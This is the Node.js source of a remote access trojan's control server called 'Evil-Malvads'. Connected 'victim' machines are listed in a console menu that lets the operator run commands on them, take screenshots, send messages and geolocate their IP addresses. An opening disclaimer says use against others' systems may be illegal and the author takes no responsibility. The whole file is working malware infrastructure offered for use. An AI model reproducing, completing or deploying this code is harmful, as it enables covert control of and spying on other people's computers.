const figlet = require('figlet')
const config = require('./config')
const WebSocket = require('ws')
const colors = require('colors')
const { v4: uuidv4 } = require('uuid')
const geoip = require('geoip-lite')
const readline = require('readline')

const reader = readline.createInterface({
    input: process.stdin,
    output: process.stdout
}) 

figlet('Evil-Malvads :(:):', function(err, res){
    if(!err){
        console.log(res)
        console.log(colors.red('Use this type of tool targeting system that you dont own can be illegal in your country... Me (Miguel √Ålvarez) I will be exempt from any damage caused to another system!'))
        console.log('.....................................................................')
        console.log('')
        console.log('[serv_port] = ' + config.serv_port)
        console.log('[serv_max_clients] = ' + config.max_clients)
        new MalvadsServer()
    }
})

class MalvadsServer {
    constructor(){
        this.serv = null
        this.port = config.serv_port
        this.maxClients = config.max_clients
        this.clients = {}
        this.init()
    }
    getClientsLength(){
        return Object.keys(this.clients).length
    }

    init(){
        this.serv = new WebSocket.Server({
            port: this.port
        })
        this.initConnConfig()
    }
    execCommand(){

    }
    printClients(){
        let info = ''
        let index = 0
        for(let id in this.clients){
            info += `[${index} | ${this.clients[id]._socket.remoteAddress} | ${id}] \n`
            index++
        }
        console.log(info)
    }
    initReader(){
        const length = this.getClientsLength()
        reader.question(`Evil-Malvads [Clients Connected = ${colors.green(length)}] | Select Option : `,function(answer){
            let ans = answer.split('|')
            switch(ans[0]){
                case '--get_frame':
                    this.clients[ans[1]].reqImg()
                    break;
                case '--exec_command':
                    this.clients[ans[1]].execCommandcmd(ans[2])
                    break;
                case '--help':
                    console.log('--exec_command = execute command on a target')
                    console.log('--get_clients_info = Get All Clients and their info (ip, socket_id, etc...)')
                    console.log('--send_message ${socket_id} ${msg} = Send A message to specific client...')
                    console.log('--geo ${ip} = Get Info about an ip address (place wheir he lives, etc)')
                    console.log('--get_frame ${socket_id} = Get screenshoot from victim')
                    break;
                case '--geo':
                    const geo = geoip.lookup(ans[1])
                    console.log(geo)
                    break;
                case '--get_clients_info':
                        this.printClients()
                    break;
                case '--send_message':
                        let msg = ''
                        for(let i = 0; i < ans.length; i++){
                            if(i == 0 || i == 1){
                            } else {
                                msg += ans[i]
                            }
                        }
                        this.clients[ans[1]].sendMessage(msg)
                    break;
                default:
                    console.log(colors.red('Unknow Option!'))
                    break;
            }
            this.initReader()
        }.bind(this))
    }
    openImg(data){
        require("fs").writeFile("out.png", data, 'base64', function(err) {
            console.log(err)
        })
    }
    initConnConfig(){
        this.initReader()
        this.serv.on('connection', function(socket){
            if(this.getClientsLength() < this.maxClients){
                const ID = uuidv4()
                console.log(`[${socket._socket.remoteAddress} | ${ID}] Connected To Server... Waiting Master! :)`)
                socket.userId = ID
                socket.sendMessage = function(e){
                    socket.send(JSON.stringify({
                        type:"msg",
                        content:e
                    }))
                }
                socket.reqImg = function(){
                    socket.send(JSON.stringify({
                        type:"img"
                    }))                  
                }
                socket.execCommandcmd = function(e){
                    socket.send(JSON.stringify({
                        type:"cmd",
                        content:e
                    }))
                }
                socket.on('message', function(msg){
                    msg = JSON.parse(msg)
                    switch(msg.type){
                        case 'cmd':
                            console.log(colors.green(msg.content))
                            break
                        case 'img':
                            this.openImg(msg.content)
                            break;
                    }
                }.bind(this))
                socket.on('close', function(){
                    delete this.clients[socket.userId]
                    console.log('Socket Disconnected From The Server, User ID = ' + socket.userId)
                }.bind(this))
                this.clients[ID] = socket
            }
        }.bind(this))
    }
}
